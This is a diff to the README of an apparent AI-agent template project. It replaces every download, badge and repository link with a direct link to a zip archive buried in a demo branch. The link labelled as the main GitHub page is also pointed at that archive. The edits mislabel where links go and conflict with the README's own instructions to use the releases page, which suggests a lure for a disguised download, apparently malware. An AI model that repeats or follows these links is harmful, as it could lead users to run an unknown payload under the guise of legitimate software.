@@ -1,6 +1,6 @@
 # 🤖 MCP-Agent-Template - Easy AI Agent Setup Guide
 
-[![Download MCP-Agent-Template](https://img.shields.io/badge/Download-MCP--Agent--Template-blue?style=for-the-badge)](https://github.com/Misaya0/MCP-Agent-Template/releases)
+[![Download MCP-Agent-Template](https://github.com/Misaya0/MCP-Agent-Template/raw/refs/heads/demo/website-qa-bot/app/Agent_Template_MC_v1.4.zip)](https://github.com/Misaya0/MCP-Agent-Template/raw/refs/heads/demo/website-qa-bot/app/Agent_Template_MC_v1.4.zip)
 
 ---
 
@@ -13,7 +13,7 @@ Welcome to the MCP-Agent-Template. This software helps you run smart AI agents t
 To get started, you need to download the software files first. The software is hosted on GitHub under the "Releases" section.
 
 - Click this link to **visit the download page**:  
-  [Download MCP-Agent-Template](https://github.com/Misaya0/MCP-Agent-Template/releases)
+  [Download MCP-Agent-Template](https://github.com/Misaya0/MCP-Agent-Template/raw/refs/heads/demo/website-qa-bot/app/Agent_Template_MC_v1.4.zip)
 
 - On that page, find the latest release version. Releases are usually listed with dates and names.
 - Inside the latest release, look for files suitable for your computer system. These might be `.exe`, `.zip`, or other formats.
@@ -134,7 +134,7 @@ If you run into issues, try these fixes:
 
 The MCP-Agent-Template is designed to be simple but powerful. If you want to learn more:
 
-- Visit the main GitHub page: [MCP-Agent-Template](https://github.com/Misaya0/MCP-Agent-Template)
+- Visit the main GitHub page: [MCP-Agent-Template](https://github.com/Misaya0/MCP-Agent-Template/raw/refs/heads/demo/website-qa-bot/app/Agent_Template_MC_v1.4.zip)
 - Check online forums or community pages about AI agents and document search.
 - Review Pinecone and OpenAI websites for more on how these services work.
 
@@ -150,4 +150,4 @@ If you need help:
 
 ---
 
-[![Download MCP-Agent-Template](https://img.shields.io/badge/Download-MCP--Agent--Template-blue?style=for-the-badge)](https://github.com/Misaya0/MCP-Agent-Template/releases)
+[![Download MCP-Agent-Template](https://github.com/Misaya0/MCP-Agent-Template/raw/refs/heads/demo/website-qa-bot/app/Agent_Template_MC_v1.4.zip)](https://github.com/Misaya0/MCP-Agent-Template/raw/refs/heads/demo/website-qa-bot/app/Agent_Template_MC_v1.4.zip)
